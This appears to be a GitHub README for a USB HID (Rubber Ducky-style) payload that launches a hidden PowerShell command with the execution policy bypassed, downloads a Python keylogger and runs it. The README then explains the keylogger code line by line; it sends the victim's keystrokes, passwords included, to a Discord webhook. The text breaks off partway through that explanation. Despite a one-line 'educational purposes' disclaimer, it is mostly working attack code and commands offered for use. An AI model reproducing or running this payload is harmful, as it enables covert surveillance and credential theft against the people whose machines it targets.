THIS IS ONLY MADE FOR EDUCATIONAL PURPOSES


# What it Does

This payload executes a powershell command that downloads a python keylogger and runs it. This keylogger sends the keys pressed over discord using a webhook.

# Dependencies

- Windows
- Python

# How it Works:

## The rubber ducky script
When the grabber.dd runs it opens a powershell terminal window and enters this string:

```powershell
powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE\Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile $Env:USERPROFILE\Documents\logger.py ; py -m pip install discordwebhook pynput ; Python logger.py <Your discord webhook here>"
```

### Flags used:

The ```powershell -w h -NoP -NonI -Exec Bypass -c``` tells powershell to execute a set of commands with some flags:
- ```-w h``` tells powershell to run in a hidden window so the victim cant see logs
- ```-NoP``` makes sure that none of the users profiles are loaded, which could mess up execution
- ```-NonI``` Makes the user unable to interact with the script while its running
- ```-Exec Bypass``` Makes powershell bypass the execution policy which allows powershell to run scripts
- ```-c``` tells powershell what commands to execute, the commands are enclosed in quotes and seperated with semicolons
- Now the script proceecds to execute a sequence of commands

(copied from the [chrome password stealer](https://github.com/simen64/Pico-HID-Scripts/tree/main/chrome-password-stealerw) README thats made by me)

### Commands ran:

1. First we run ```cd $env:USERPROFILE\Documents``` to enter the users Documents folder where we will be downloading our keylogger
1 . Then we use ```iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile $Env:USERPROFILE\Documents\logger.py``` to download the ```logger.py``` script and place it in the Documents folder using -OutFile
3. Before running the python script we use ```py -m pip install discordwebhook pynput``` to download the needed python libraries (if these libraries are found pip skips this step and proceeds)
4. And last we do ```Python logger.py <Your discord webhook here>``` to run the python script and using our webhook as an argument which the python script uses
 
## The keylogger script

The logger script starts by importing the needed libraries which are downloaded in the previous step (some libraries are included by default in python)
```python
from pynput.keyboard import Key, Listener
import time
import threading
from discordwebhook import Discord
import sys
```
Now we tell python what our webhook is by using ```sys.argv[1]``` to take our argument (which we set to our webhook) and put it into the variable called ```hook_url``` Then we tell the discord library that our webhook is the ```hook_url``` which in turn is stored in the ```discord``` variable
```python
hook_url = sys.argv[1]
discord = Discord(url=hook_url)
```
After that is set up we need to define some variables and lists that the logger will use. The ```word``` list is used to store the keypresses recorded by [pynput](https://pypi.org/project/pynput/) ```last_pressed``` is going to be used later but is for now just set to the time. ```idle_message``` will also be explained more in detail later and is for now set to ```false```
```python
word = []
last_pressed = time.time()
idle_message = False
```
Now we move over to where we actually record the key presses.
First we define our function called ```on_press``` which is what actually does the recording of keypresses. Then we set the variables ```last_pressed``` and ```idle_message``` to global so we can access them within the function. After that we set ```last_pressed``` to ```time.time``` this variable will become important later. And the ```key_pressed =('{0}'.format(
        key))``` is used for turning the keypress into a string, so if i press the **a** key the variable ```key_pressed``` will store ```'a'```
```python
def on_press(key):
    global last_pressed, idle_message
    last_pressed = time.time()
    key_pressed =('{0}'.format(
        key))
```
After this you will see alot of if statements if you read through the code. These will be explained later, but keep in mind that this ```else:``` statement are after all of those if statements.
This else statement is what happens when a key is pressed (except the ones i will talk about after this, but dont think about that now)
When this statement is triggered we append the ```key_pressed``` variable previously defined to our ```word``` list. Then we set the variable ```idle_message``` to ```false``` which will become important later.
```python3
else:
 word.append(key_pressed)
 idle_message = False
```
this is where this keylogger stands out from some of the other ones you can find. Instead of sending each keypress individually over discord spamming your server and making it difficult to read, this keylogger sends what you have typed after you have pressed space or enter. This makes the output on discord be words instad of letters, and when the victim types something like a password it also shows up as they press enter. Heres how all that works:
